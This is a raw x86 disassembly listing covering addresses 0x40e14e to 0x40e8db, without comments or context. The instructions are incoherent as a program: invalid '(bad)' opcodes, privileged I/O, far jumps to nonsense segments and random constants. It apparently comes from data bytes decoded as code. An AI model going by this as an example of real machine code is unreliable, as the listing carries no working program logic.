  40e14e:	xlat   BYTE PTR ds:[ebx]
  40e14f:	rcr    DWORD PTR [esi-0x79cb9b96],0x3a
  40e156:	and    al,bh
  40e158:	xchg   ebp,eax
  40e159:	aaa    
  40e15a:	adc    BYTE PTR [ecx+0xb],bh
  40e15d:	mov    BYTE PTR [ebp-0x77],dh
  40e160:	jb     0x40e0f4
  40e162:	sub    BYTE PTR [esi],bl
  40e164:	mov    ?,ecx
  40e166:	in     eax,0x3e
  40e168:	(bad)  
  40e16a:	sbb    al,0x43
  40e16c:	bnd call 0x3ba26fc1
  40e172:	xchg   ebp,eax
  40e173:	xor    eax,0xbaf9c9e7
  40e178:	push   esi
  40e179:	das    
  40e17a:	sub    ebx,DWORD PTR [edi]
  40e17c:	adc    bl,BYTE PTR [eax]
  40e17e:	lea    eax,[esi+0x55]
  40e181:	mul    BYTE PTR [ebp+0x7cbebf39]
  40e187:	pop    edi
  40e188:	loop   0x40e163
  40e18a:	mov    ah,0x7c
  40e18c:	or     ebx,DWORD PTR [edx]
  40e18e:	dec    esp
  40e18f:	push   0xe9edfa00
  40e194:	(bad)  
  40e195:	out    dx,eax
  40e196:	mov    ds:0x6a707dc3,al
  40e19b:	or     ecx,DWORD PTR [ebx+ecx*4]
  40e19e:	retf   
  40e19f:	lock icebp 
  40e1a1:	out    0x19,al
  40e1a3:	cli    
  40e1a4:	sbb    al,0xa1
  40e1a6:	pop    ebx
  40e1a7:	les    esp,FWORD PTR [eax+ebp*4+0x39]
  40e1ab:	retf   
  40e1ac:	loope  0x40e162
  40e1ae:	adc    BYTE PTR [ecx+ebp*8],0xf5
  40e1b2:	xchg   edx,ebp
  40e1b4:	mov    dl,0x5b
  40e1b6:	stos   DWORD PTR es:[edi],eax
  40e1b7:	(bad)  
  40e1b8:	(bad)  
  40e1b9:	dec    esi
  40e1ba:	pop    eax
  40e1bb:	pop    ebp
  40e1bc:	pushf  
  40e1bd:	in     al,0xe9
  40e1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1c0:	push   es
  40e1c1:	cmp    dl,BYTE PTR [edx-0x483c4acc]
  40e1c7:	sub    al,0xac
  40e1c9:	lahf   
  40e1ca:	les    edx,FWORD PTR [ecx-0x2619fe8a]
  40e1d0:	sti    
  40e1d1:	jmp    0x5517:0x789bc71f
  40e1d8:	sbb    ebp,DWORD PTR [eax-0x71]
  40e1db:	cmp    al,0xb7
  40e1dd:	push   ds
  40e1de:	into   
  40e1df:	mov    bl,0x3c
  40e1e1:	hlt    
  40e1e2:	loop   0x40e1fa
  40e1e4:	mov    DWORD PTR [edi+eiz*8-0x73],ecx
  40e1e8:	push   es
  40e1e9:	add    al,0x18
  40e1eb:	push   ss
  40e1ec:	fbld   TBYTE PTR ss:[edx+edi*2-0x22874621]
  40e1f4:	arpl   WORD PTR [eax],di
  40e1f6:	sti    
  40e1f7:	xchg   esi,eax
  40e1f8:	sbb    esp,edx
  40e1fa:	adc    eax,0x523b57f
  40e1ff:	dec    ebp
  40e200:	inc    esp
  40e201:	mov    al,ds:0x371e5ae0
  40e206:	pop    ebp
  40e207:	mov    edi,0x75a0427f
  40e20c:	jbe    0x40e1cc
  40e20e:	mov    BYTE PTR [ebx],0xb2
  40e211:	inc    edi
  40e212:	sbb    eax,0xcc5b21d7
  40e217:	test   BYTE PTR [ebp+0x78],0xff
  40e21b:	adc    al,0x0
  40e21d:	dec    eax
  40e21e:	pop    esi
  40e21f:	jae    0x40e274
  40e221:	gs inc eax
  40e223:	pusha  
  40e224:	popa   
  40e225:	fld    TBYTE PTR [eax+0x11e10ec0]
  40e22b:	dec    ecx
  40e22c:	push   0xf877003f
  40e231:	lock mov ecx,0xe39fe7d2
  40e237:	adc    esi,DWORD PTR [ecx]
  40e239:	sbb    al,0xf
  40e23b:	inc    ebp
  40e23c:	jnp    0x40e1f6
  40e23e:	(bad)  
  40e23f:	shl    BYTE PTR [ebp+0x1f59e1d4],cl
  40e245:	lock mov eax,ds:0xf1e8da47
  40e24b:	cld    
  40e24c:	inc    esp
  40e24d:	dec    ebx
  40e24e:	add    DWORD PTR [ebx],eax
  40e250:	push   0xb15a8bde
  40e255:	iret   
  40e256:	outs   dx,DWORD PTR fs:[esi]
  40e258:	(bad)  
  40e259:	sub    ch,BYTE PTR [eax+0x31faf86a]
  40e25f:	mov    al,ds:0x89845b33
  40e264:	or     DWORD PTR ds:0x4b13c4bf,esp
  40e26a:	mov    ch,0x6f
  40e26c:	call   0xfa7e:0xf339ff03
  40e273:	mov    ebp,0x71f83305
  40e278:	cdq    
  40e279:	cmp    DWORD PTR [eax+0x1ec4382],eax
  40e27f:	pop    edx
  40e280:	pusha  
  40e281:	fucomi st,st(2)
  40e283:	fstp   TBYTE PTR [eax+ebp*8]
  40e286:	call   eax
  40e288:	arpl   WORD PTR ds:0x2dc4f350,cx
  40e28e:	cli    
  40e28f:	push   edx
  40e290:	mov    eax,ds:0xbecca0e2
  40e295:	dec    ecx
  40e296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e297:	or     ebx,DWORD PTR [esp+ebx*2]
  40e29a:	add    bl,BYTE PTR [ebp-0x42298d94]
  40e2a0:	inc    ebp
  40e2a1:	dec    ebx
  40e2a2:	ds or  al,0x53
  40e2a5:	or     DWORD PTR [ecx+0x24],0xaf47cc13
  40e2ac:	cmp    al,0x8e
  40e2ae:	adc    BYTE PTR [edi-0x49],bl
  40e2b1:	mov    eax,0xacb0cae4
  40e2b6:	jbe    0x40e2be
  40e2b8:	inc    edx
  40e2b9:	cmc    
  40e2ba:	mov    edi,0xf481836c
  40e2bf:	mov    ds:0xdd1a0422,al
  40e2c4:	sar    BYTE PTR [edi+0x6f],0x91
  40e2c8:	mov    ebp,0xd4ca58dc
  40e2cd:	fistp  WORD PTR [ebx+0x55706a80]
  40e2d3:	cmp    bh,al
  40e2d5:	in     eax,dx
  40e2d6:	push   ebp
  40e2d7:	lods   al,BYTE PTR ds:[esi]
  40e2d8:	nop
  40e2d9:	cmp    BYTE PTR [ecx-0x430b1c7b],dh
  40e2df:	inc    ecx
  40e2e0:	and    DWORD PTR [ecx],ebx
  40e2e2:	cmp    ecx,DWORD PTR [edx+ebx*1]
  40e2e5:	clc    
  40e2e6:	cmp    eax,ebp
  40e2e8:	test   edx,ebx
  40e2ea:	loopne 0x40e308
  40e2ec:	jns    0x40e285
  40e2ee:	cmp    BYTE PTR [ebx],dh
  40e2f0:	rcl    BYTE PTR [esi-0x48],1
  40e2f3:	add    al,BYTE PTR [ebx]
  40e2f5:	imul   esi,edx,0xffffffaa
  40e2f8:	ficom  WORD PTR [esi+0x4a]
  40e2fb:	mov    ?,WORD PTR [esi+0x3b81deb2]
  40e301:	add    eax,0xb130cf27
  40e306:	cmc    
  40e307:	inc    eax
  40e308:	sub    BYTE PTR [ebx+ebp*2+0x5e],al
  40e30c:	(bad)  
  40e30d:	imul   ebp,ebp,0xa15332b3
  40e313:	and    eax,0xbcec4404
  40e318:	push   0x2b
  40e31a:	in     eax,0x1e
  40e31c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e31d:	ja     0x40e367
  40e31f:	fnstsw WORD PTR [ecx+0x55]
  40e322:	mov    ds:0x22222adc,eax
  40e327:	ins    BYTE PTR es:[edi],dx
  40e328:	loop   0x40e2cb
  40e32a:	push   ds
  40e32b:	sbb    DWORD PTR [eax+0x2a],ebx
  40e32e:	jb     0x40e39a
  40e330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e331:	add    BYTE PTR [edi-0xdbab854],dh
  40e337:	outs   dx,BYTE PTR ds:[esi]
  40e338:	adc    BYTE PTR [edi-0x62],dh
  40e33b:	js     0x40e37d
  40e33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e33f:	in     eax,0xbd
  40e341:	ret    
  40e342:	and    al,0x8a
  40e344:	push   esp
  40e345:	aam    0x7e
  40e347:	scas   eax,DWORD PTR es:[edi]
  40e348:	add    esp,0xc458f178
  40e34e:	xchg   edi,eax
  40e34f:	xor    DWORD PTR [eax+0x32],ebx
  40e352:	adc    ecx,DWORD PTR [edi+0x47ba99a6]
  40e358:	xor    eax,0x24d4d1e0
  40e35d:	pusha  
  40e35e:	dec    ebp
  40e35f:	or     ebp,esi
  40e361:	hlt    
  40e362:	mov    edx,0xdfe848b
  40e367:	push   ebp
  40e368:	in     al,0xa5
  40e36a:	call   0x4706:0xb1f091b8
  40e371:	lods   eax,DWORD PTR ds:[esi]
  40e372:	mov    ecx,0x72d28e91
  40e377:	add    ch,bl
  40e379:	xor    al,0xf3
  40e37b:	loope  0x40e3af
  40e37d:	mov    esp,0x90787cf4
  40e382:	test   eax,0x14939ae3
  40e387:	(bad)  
  40e388:	fld    DWORD PTR [esi]
  40e38a:	test   BYTE PTR [edi],bl
  40e38c:	push   edi
  40e38d:	mov    ds:0x4579ae2a,eax
  40e392:	jg     0x40e3f4
  40e394:	inc    ebp
  40e395:	pop    ds
  40e396:	bound  esi,QWORD PTR [esi+0x4c]
  40e399:	daa    
  40e39a:	std    
  40e39b:	div    bh
  40e39d:	jl     0x40e3a9
  40e39f:	cwde   
  40e3a0:	sbb    DWORD PTR [esi],ebp
  40e3a2:	mov    esp,0x2e2a2022
  40e3a7:	arpl   WORD PTR [esi+0x7eadf921],dx
  40e3ad:	or     dh,BYTE PTR [ecx]
  40e3af:	aad    0x13
  40e3b1:	mov    bh,0xf2
  40e3b3:	jge    0x40e3a7
  40e3b5:	neg    DWORD PTR [edx+0x5ab8c58d]
  40e3bb:	pop    edx
  40e3bc:	in     al,dx
  40e3bd:	shr    dl,cl
  40e3bf:	mov    dh,0x97
  40e3c1:	enter  0x5d60,0x6b
  40e3c5:	aad    0x26
  40e3c7:	pop    ecx
  40e3c8:	jno    0x40e411
  40e3ca:	dec    ebx
  40e3cb:	inc    ecx
  40e3cc:	sbb    BYTE PTR [ebx],dl
  40e3ce:	xlat   BYTE PTR ds:[ebx]
  40e3cf:	sbb    eax,0x2501c68a
  40e3d4:	aaa    
  40e3d5:	mov    ecx,DWORD PTR [edi+edi*2+0x33f55fb4]
  40e3dc:	mov    dl,0x99
  40e3de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3df:	enter  0x4048,0x3b
  40e3e3:	sub    ch,BYTE PTR [esp+eax*2-0x1a]
  40e3e7:	adc    al,0x3e
  40e3e9:	xchg   esp,eax
  40e3ea:	xchg   ecx,eax
  40e3eb:	mov    esi,0x5508b68d
  40e3f0:	push   ebp
  40e3f1:	vmulpd ymm3,ymm7,YMMWORD PTR [edx+0x5d]
  40e3f6:	cmp    al,0xf8
  40e3f8:	inc    ebp
  40e3f9:	push   esp
  40e3fa:	out    dx,al
  40e3fb:	fimul  DWORD PTR [eax-0x7e]
  40e3fe:	dec    edx
  40e3ff:	stos   DWORD PTR es:[edi],eax
  40e400:	call   0x6af:0x3e638360
  40e407:	aas    
  40e408:	mov    ds:0xb513dd3e,eax
  40e40d:	and    al,0xd4
  40e40f:	fucomi st,st(1)
  40e411:	rcr    DWORD PTR [edx-0x158505af],cl
  40e417:	or     eax,0x7633060f
  40e41c:	xchg   ebx,eax
  40e41d:	js     0x40e416
  40e41f:	cmp    BYTE PTR [edx+0x37263851],bh
  40e425:	imul   edx,eax,0xf25e7fa0
  40e42b:	daa    
  40e42c:	pminsw mm3,QWORD PTR [eax+edi*1-0x25644a0f]
  40e434:	mov    ebp,0xa8892403
  40e439:	in     al,dx
  40e43a:	xor    esp,esi
  40e43c:	mov    ebp,0xa9889f5c
  40e441:	fidivr DWORD PTR [edi+0x0]
  40e444:	ret    0xf8ab
  40e447:	pusha  
  40e448:	inc    edi
  40e449:	dec    eax
  40e44a:	pavgb  mm7,QWORD PTR [ebx-0x5b]
  40e44e:	mov    BYTE PTR [ebp+0x76],bl
  40e451:	jne    0x40e471
  40e453:	shl    DWORD PTR [ecx],cl
  40e455:	(bad)  
  40e456:	cwde   
  40e457:	ror    BYTE PTR [esi+0x38958b8c],1
  40e45d:	pcmpgtb mm7,QWORD PTR [ebx]
  40e460:	jmp    0x1a6f:0x559874bb
  40e467:	jbe    0x40e4c2
  40e469:	stos   DWORD PTR es:[edi],eax
  40e46a:	cmp    DWORD PTR [ecx+eax*1],esp
  40e46d:	ds sub al,0x13
  40e470:	and    ebp,DWORD PTR [ebp+eax*8+0x7]
  40e474:	mov    al,0xa4
  40e476:	inc    edi
  40e477:	pop    esp
  40e478:	push   0xfc35b402
  40e47d:	cmp    esi,DWORD PTR [edx+0x19a29b01]
  40e483:	aad    0xf1
  40e485:	push   edi
  40e486:	lds    ebp,FWORD PTR [eax+eax*8+0x1e]
  40e48a:	add    edx,DWORD PTR [edi+0x31869a3a]
  40e490:	fst    st(2)
  40e492:	lock pop esi
  40e494:	xchg   dl,bl
  40e496:	call   0x50c7:0xa69a59d8
  40e49d:	test   BYTE PTR [ebp-0x204a54a3],al
  40e4a3:	or     ebp,edi
  40e4a5:	dec    esp
  40e4a6:	adc    BYTE PTR [eax-0x13a1f502],bl
  40e4ac:	fiadd  WORD PTR ds:[ecx+0x2c]
  40e4b0:	or     DWORD PTR [ebx+0x67],0xb6d831fd
  40e4b7:	and    DWORD PTR [edx+0x82fb6bf],edx
  40e4bd:	sub    esp,esp
  40e4bf:	mov    ?,edx
  40e4c1:	outs   dx,DWORD PTR ds:[esi]
  40e4c2:	imul   esi,DWORD PTR [ebx],0x52
  40e4c5:	push   esi
  40e4c6:	div    ecx
  40e4c8:	add    al,0x80
  40e4ca:	jecxz  0x40e492
  40e4cc:	jecxz  0x40e50f
  40e4ce:	js     0x40e487
  40e4d0:	xchg   edi,eax
  40e4d1:	int    0x16
  40e4d3:	in     al,dx
  40e4d4:	aad    0xe7
  40e4d6:	dec    edx
  40e4d7:	mov    edi,edx
  40e4d9:	inc    ecx
  40e4da:	cld    
  40e4db:	repnz repnz xor edi,ebx
  40e4df:	adc    BYTE PTR [edx+0x73b14ac0],dh
  40e4e5:	jmp    0x5fae:0xd4c68fc7
  40e4ec:	pop    ebx
  40e4ed:	sbb    DWORD PTR [ebx-0x74cb8abf],esp
  40e4f3:	in     al,dx
  40e4f4:	dec    edi
  40e4f5:	repz fsub DWORD PTR [esi-0x13]
  40e4f9:	shl    DWORD PTR [ebx-0x1f],1
  40e4fc:	adc    ecx,DWORD PTR [edx]
  40e4fe:	dec    edi
  40e4ff:	sub    DWORD PTR [edx],0xffffffdd
  40e502:	fwait
  40e503:	inc    edi
  40e504:	ds xchg esp,eax
  40e506:	adc    ebp,DWORD PTR [edx]
  40e508:	xchg   BYTE PTR [edx+0x3fc73336],dl
  40e50e:	adc    eax,0x5e204512
  40e513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e514:	loope  0x40e506
  40e516:	jne    0x40e582
  40e518:	idiv   DWORD PTR [edi+ebp*4-0x60]
  40e51c:	jecxz  0x40e4ca
  40e51e:	lock push esi
  40e520:	cmp    esp,DWORD PTR [ebx+0x14]
  40e523:	ins    DWORD PTR es:[edi],dx
  40e524:	inc    ecx
  40e525:	add    eax,0x42fdc114
  40e52a:	ins    BYTE PTR es:[edi],dx
  40e52b:	sub    eax,0xb921a7af
  40e530:	xor    dh,BYTE PTR [ebp+0x2f]
  40e533:	and    eax,DWORD PTR [ebx+0x24323352]
  40e539:	fdiv   QWORD PTR [eax-0x6850970b]
  40e53f:	lea    edi,[ebp-0x57]
  40e542:	pop    ds
  40e543:	pop    eax
  40e544:	or     ebp,ebp
  40e546:	lea    esi,[ecx+0x121e55e3]
  40e54c:	fmul   st(0),st
  40e54e:	iret   
  40e54f:	sbb    al,BYTE PTR [ebp-0x640e4d8d]
  40e555:	add    al,0xea
  40e557:	(bad)  
  40e559:	lahf   
  40e55a:	test   BYTE PTR [ebp-0x9],cl
  40e55d:	and    eax,0x97706c1e
  40e562:	mov    dh,0x2b
  40e564:	xor    edx,DWORD PTR [bp+si-0xe]
  40e568:	fsub   QWORD PTR [edi]
  40e56a:	inc    ebp
  40e56b:	dec    ebx
  40e56c:	sar    DWORD PTR [edx+0x68865f98],0x3
  40e573:	js     0x40e5cd
  40e575:	xchg   esp,eax
  40e576:	js     0x40e56d
  40e578:	pop    ds
  40e579:	and    al,0xcf
  40e57b:	jg     0x40e5e5
  40e57d:	mov    ecx,0x4e0d50dc
  40e582:	mov    ebx,0xa1f970c
  40e587:	ins    DWORD PTR es:[edi],dx
  40e588:	sub    al,BYTE PTR [eax+ecx*2-0x7ef8c86f]
  40e58f:	add    esp,DWORD PTR [ebp-0x3e2933a9]
  40e595:	ins    DWORD PTR es:[edi],dx
  40e596:	ja     0x40e5cf
  40e598:	add    al,BYTE PTR [ecx-0x37]
  40e59b:	je     0x40e58f
  40e59d:	sti    
  40e59e:	jge    0x40e617
  40e5a0:	outs   dx,DWORD PTR ds:[esi]
  40e5a1:	mov    ds:0xa65a356d,eax
  40e5a6:	pop    edi
  40e5a7:	repz and cl,BYTE PTR [ebp-0x7dfb6077]
  40e5ae:	mov    al,ds:0xc17901c6
  40e5b3:	repz push esp
  40e5b5:	shl    eax,1
  40e5b7:	ins    BYTE PTR es:[edi],dx
  40e5b8:	lods   eax,DWORD PTR ds:[esi]
  40e5b9:	mov    eax,ds:0xeedef3fc
  40e5be:	int    0xfa
  40e5c0:	pop    edi
  40e5c1:	mov    edi,DWORD PTR [edi-0x48010abe]
  40e5c7:	rcl    BYTE PTR [esi],cl
  40e5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5ca:	jo     0x40e5ad
  40e5cc:	cmp    eax,0xae0c2a86
  40e5d1:	or     eax,0x74efaf6e
  40e5d6:	ret    0x8f5f
  40e5d9:	xlat   BYTE PTR ds:[ebx]
  40e5da:	es (bad) 
  40e5dc:	xchg   edi,eax
  40e5dd:	(bad)  
  40e5de:	repz (bad) 
  40e5e0:	jmp    0x40e565
  40e5e2:	daa    
  40e5e3:	sbb    DWORD PTR [edi-0x17fa1876],edi
  40e5e9:	std    
  40e5ea:	cli    
  40e5eb:	and    al,0xc3
  40e5ed:	cmc    
  40e5ee:	ins    BYTE PTR es:[edi],dx
  40e5ef:	stos   DWORD PTR es:[edi],eax
  40e5f0:	add    ebp,DWORD PTR [ecx+0x608fb8de]
  40e5f6:	mov    eax,0x33a4e804
  40e5fb:	mov    esi,0x2171087
  40e600:	pop    esp
  40e601:	sbb    DWORD PTR [ebx-0x63],0xcf6b14b4
  40e608:	xor    al,0x51
  40e60a:	shl    BYTE PTR cs:[ebp+0xb],0xb1
  40e60f:	inc    edx
  40e610:	pop    ebp
  40e611:	pop    esi
  40e612:	sbb    BYTE PTR [esi],ah
  40e614:	xchg   edx,eax
  40e615:	imul   edx,DWORD PTR [ecx+0x4b29a7eb],0xfe4995ec
  40e61f:	mov    bh,0x11
  40e621:	lods   al,BYTE PTR ds:[esi]
  40e622:	mov    al,0x37
  40e624:	div    BYTE PTR [edx]
  40e626:	das    
  40e627:	rol    BYTE PTR [ebx+eiz*8-0x1bbdcda5],0xad
  40e62f:	mov    dh,0xde
  40e631:	inc    ecx
  40e632:	push   ebp
  40e633:	js     0x40e5be
  40e635:	pop    ebx
  40e636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e637:	and    ebp,DWORD PTR [esi-0x62]
  40e63a:	jg     0x40e6a1
  40e63c:	mov    ebp,0xfbd338a9
  40e641:	pushf  
  40e642:	push   edx
  40e643:	scas   al,BYTE PTR es:[edi]
  40e644:	test   ebp,0x8dcaeaa0
  40e64a:	or     al,0xec
  40e64c:	jae    0x40e60f
  40e64e:	sub    bl,bh
  40e650:	dec    esi
  40e651:	inc    esp
  40e652:	cdq    
  40e653:	stc    
  40e654:	xchg   BYTE PTR [ecx],dl
  40e656:	hlt    
  40e657:	jbe    0x40e5e1
  40e659:	outs   dx,BYTE PTR ds:[esi]
  40e65a:	cmp    BYTE PTR [ebx-0x23333f1d],dl
  40e660:	jnp    0x40e63c
  40e662:	jle    0x40e65b
  40e664:	xchg   ebx,eax
  40e665:	adc    cl,ah
  40e667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e668:	push   0x68be23b4
  40e66d:	push   edi
  40e66e:	adc    BYTE PTR [edi-0x6f],bl
  40e671:	xor    eax,0xf5d147e3
  40e676:	ror    BYTE PTR [esi+0x209d9797],cl
  40e67c:	inc    ecx
  40e67d:	add    al,0x84
  40e67f:	call   FWORD PTR [eax+0x43]
  40e682:	(bad)  
  40e683:	jmp    0xc4dc:0x845f3d2a
  40e68a:	fsub   st,st(3)
  40e68c:	bound  esi,QWORD PTR [esi+0x69658cc]
  40e692:	mov    edx,0xae0b95ee
  40e697:	dec    ebx
  40e698:	fidivr DWORD PTR [ebx+0x7d8437b9]
  40e69e:	and    DWORD PTR [esi],edi
  40e6a0:	jge    0x40e6ed
  40e6a2:	popa   
  40e6a3:	loop   0x40e696
  40e6a5:	and    eax,0x68134b2b
  40e6aa:	sub    eax,0xf26fa3c5
  40e6af:	xor    ch,BYTE PTR [edx+esi*1]
  40e6b2:	call   DWORD PTR [edx+0x78]
  40e6b5:	dec    edx
  40e6b6:	shr    BYTE PTR [edx-0x7eb06fe2],1
  40e6bc:	inc    ecx
  40e6bd:	sub    ah,al
  40e6bf:	mov    al,BYTE PTR [ecx+0x19a36a37]
  40e6c5:	add    eax,esi
  40e6c7:	xor    eax,0xfdb40933
  40e6cc:	dec    eax
  40e6cd:	xlat   BYTE PTR ds:[ebx]
  40e6ce:	ins    DWORD PTR es:[edi],dx
  40e6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6d0:	xor    DWORD PTR [ebp-0x6d0aa428],ebx
  40e6d6:	loop   0x40e69b
  40e6d8:	aam    0x5e
  40e6da:	mov    ebp,0xd196fc0
  40e6df:	aad    0x64
  40e6e1:	lods   eax,DWORD PTR ds:[esi]
  40e6e2:	nop
  40e6e3:	jnp    0x40e738
  40e6e5:	cmc    
  40e6e6:	repz neg BYTE PTR ss:[edi-0x3ca0ca6d]
  40e6ee:	dec    ebx
  40e6ef:	push   ecx
  40e6f0:	mov    BYTE PTR [ebx-0x78],bl
  40e6f3:	inc    edi
  40e6f4:	mov    ecx,0xe4fa1798
  40e6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fa:	enter  0xecd4,0x9e
  40e6fe:	mov    ecx,ebx
  40e700:	retf   
  40e701:	test   BYTE PTR [eax+0x6c],ch
  40e704:	pop    es
  40e705:	inc    ecx
  40e706:	or     DWORD PTR [edi+0x29c35ce5],ebx
  40e70c:	imul   ebx,DWORD PTR [eax-0x2c924ab0],0xd420aa43
  40e716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e717:	dec    eax
  40e718:	sub    edi,DWORD PTR [ebp+0x19e84fcb]
  40e71e:	test   DWORD PTR [edx],esp
  40e720:	ins    BYTE PTR es:[edi],dx
  40e721:	fucomip st,st(6)
  40e723:	rcr    DWORD PTR [ecx-0x5d],1
  40e726:	mov    eax,ds:0x109d0c05
  40e72b:	sbb    BYTE PTR [ebp+ecx*1-0x7ae0cb36],ch
  40e732:	sti    
  40e733:	mov    edi,0xc1577cac
  40e738:	aas    
  40e739:	fistp  WORD PTR [ebx-0x27df561b]
  40e73f:	arpl   WORD PTR [edi-0x54576951],dx
  40e745:	(bad)  
  40e746:	fsubr  QWORD PTR [ebp-0x4e65e4e9]
  40e74c:	ficom  DWORD PTR [edx+eiz*4]
  40e74f:	xor    esi,DWORD PTR [edi+0xd44c804]
  40e755:	imul   ecx,DWORD PTR [ebx],0x6ee56671
  40e75b:	pusha  
  40e75c:	mov    edi,0x9fad29b7
  40e761:	fld    st(4)
  40e763:	jae    0x40e754
  40e765:	popa   
  40e766:	inc    ebx
  40e767:	jbe    0x40e792
  40e769:	(bad)  
  40e76a:	jle    0x40e7d8
  40e76c:	out    0xc9,eax
  40e76e:	das    
  40e76f:	xor    BYTE PTR [ebp+0x6f],ah
  40e772:	cli    
  40e773:	sbb    ebx,DWORD PTR [edi+0x37735a9]
  40e779:	ins    DWORD PTR es:[edi],dx
  40e77a:	cmp    BYTE PTR ds:0x295ce94b,bl
  40e780:	pushf  
  40e781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e782:	fisubr WORD PTR [esi+ecx*8+0x43de82da]
  40e789:	out    dx,al
  40e78a:	mov    al,0x50
  40e78c:	test   edx,ebx
  40e78e:	ins    BYTE PTR es:[di],dx
  40e790:	out    0x56,eax
  40e792:	adc    dl,al
  40e794:	dec    eax
  40e795:	mov    ebx,0xba72fb3
  40e79a:	lds    ebx,FWORD PTR ds:0x46809ddd
  40e7a0:	dec    esi
  40e7a1:	out    0xe0,eax
  40e7a3:	outs   dx,DWORD PTR ds:[esi]
  40e7a4:	inc    ebx
  40e7a5:	dec    edi
  40e7a6:	push   es
  40e7a7:	repnz aas 
  40e7a9:	xchg   BYTE PTR [ebx+0x67fa2903],ch
  40e7af:	xchg   esi,eax
  40e7b0:	pop    eax
  40e7b1:	jg     0x40e7e1
  40e7b3:	xor    BYTE PTR [ecx-0x3ce4aeb8],bh
  40e7b9:	jp     0x40e7d5
  40e7bb:	jmp    0xf247:0xd4e48d74
  40e7c2:	dec    esi
  40e7c3:	jo     0x40e75e
  40e7c5:	rcr    BYTE PTR ds:0x32e02b50,1
  40e7cb:	and    cl,cl
  40e7cd:	mov    dl,0x43
  40e7cf:	push   0x8215e6b8
  40e7d4:	bnd jmp 0x258b5596
  40e7da:	daa    
  40e7db:	leave  
  40e7dc:	add    eax,0x151f02d8
  40e7e1:	iret   
  40e7e2:	ret    0x4a36
  40e7e5:	jnp    0x40e7b7
  40e7e7:	jmp    FWORD PTR [esi+0xe]
  40e7ea:	or     BYTE PTR [edi-0x71547a6c],bl
  40e7f0:	and    eax,DWORD PTR [ebx+0x772a1c4c]
  40e7f6:	xchg   ebp,eax
  40e7f7:	bound  esi,QWORD PTR [edx+esi*8]
  40e7fa:	loopne 0x40e7d1
  40e7fc:	cli    
  40e7fd:	std    
  40e7fe:	int    0xce
  40e800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e801:	outs   dx,DWORD PTR ds:[esi]
  40e802:	pop    esi
  40e803:	ucomiss xmm3,DWORD PTR [edi+edx*8]
  40e807:	push   eax
  40e808:	addr16 jmp 0x40e78f
  40e80b:	cdq    
  40e80c:	push   ecx
  40e80d:	ins    BYTE PTR es:[edi],dx
  40e80e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e80f:	xchg   edi,eax
  40e810:	shr    esp,cl
  40e812:	pop    esp
  40e813:	mov    bh,BYTE PTR [edi+ecx*2+0x7fbc9bd4]
  40e81a:	in     al,dx
  40e81b:	enter  0xa633,0x11
  40e81f:	fcmovu st,st(7)
  40e821:	dec    edi
  40e822:	and    bl,BYTE PTR [edi]
  40e824:	xlat   BYTE PTR ds:[ebx]
  40e825:	fcom   DWORD PTR [edi-0x74]
  40e828:	add    al,0x7
  40e82a:	sti    
  40e82b:	daa    
  40e82c:	pusha  
  40e82d:	adc    esp,eax
  40e82f:	mov    BYTE PTR [edi+0x2a624db],dl
  40e835:	std    
  40e836:	dec    eax
  40e837:	pusha  
  40e838:	sbb    bh,BYTE PTR [edi-0x11]
  40e83b:	cdq    
  40e83c:	cmp    al,0xcf
  40e83e:	and    al,0xad
  40e840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e841:	dec    ecx
  40e842:	sti    
  40e843:	mov    ds:0x491f260f,al
  40e848:	dec    edi
  40e849:	aaa    
  40e84a:	inc    edi
  40e84b:	out    0x7,al
  40e84d:	mov    al,0x98
  40e84f:	ror    DWORD PTR [esi-0x3839e406],cl
  40e855:	test   DWORD PTR [ecx+0x3c],esp
  40e858:	mov    ecx,DWORD PTR [ebp-0x4a378e9a]
  40e85e:	add    cl,BYTE PTR ds:0xd67d42f6
  40e864:	push   ebx
  40e865:	(bad)  
  40e866:	sbb    eax,0x84fa9b6a
  40e86b:	dec    ebx
  40e86c:	pop    edx
  40e86d:	push   ds
  40e86e:	retf   0x2e4a
  40e871:	hlt    
  40e872:	adc    edx,DWORD PTR [edx+ebx*1-0x13adcfbe]
  40e879:	adc    eax,0xff8c8a7c
  40e87e:	into   
  40e87f:	retf   
  40e880:	jae    0x40e81c
  40e882:	push   esp
  40e883:	in     eax,0x38
  40e885:	mov    ecx,0x70d6c435
  40e88a:	loopne 0x40e8c2
  40e88c:	ds pop esp
  40e88e:	mov    ebx,0x8e6527f4
  40e893:	lock pop ds
  40e895:	jmp    0xda3c:0x8cafab43
  40e89c:	jne    0x40e88a
  40e89e:	sub    ebx,esi
  40e8a0:	sar    DWORD PTR ds:0xcd99f4c8,0xad
  40e8a7:	cmp    esi,DWORD PTR [edi]
  40e8a9:	xchg   dh,ah
  40e8ab:	fucomp st(1)
  40e8ad:	imul   edi,edi,0x6613bf8d
  40e8b3:	sbb    dl,bl
  40e8b5:	fcom   QWORD PTR [edx-0x466ba060]
  40e8bb:	out    dx,al
  40e8bc:	in     al,0x1a
  40e8be:	int    0xe3
  40e8c0:	adc    DWORD PTR [ebx-0x23dadd2],ebp
  40e8c6:	sbb    edi,DWORD PTR [ebx+0x74248733]
  40e8cc:	das    
  40e8cd:	mov    edx,0xef77b55b
  40e8d2:	push   esi
  40e8d3:	dec    edi
  40e8d4:	cmp    ah,ah
  40e8d6:	stos   DWORD PTR es:[edi],eax
  40e8d7:	xchg   esi,eax
  40e8d8:	retf   0x794a
  40e8db:	add    al,BYTE PTR [ebx+0x42b16f9b]
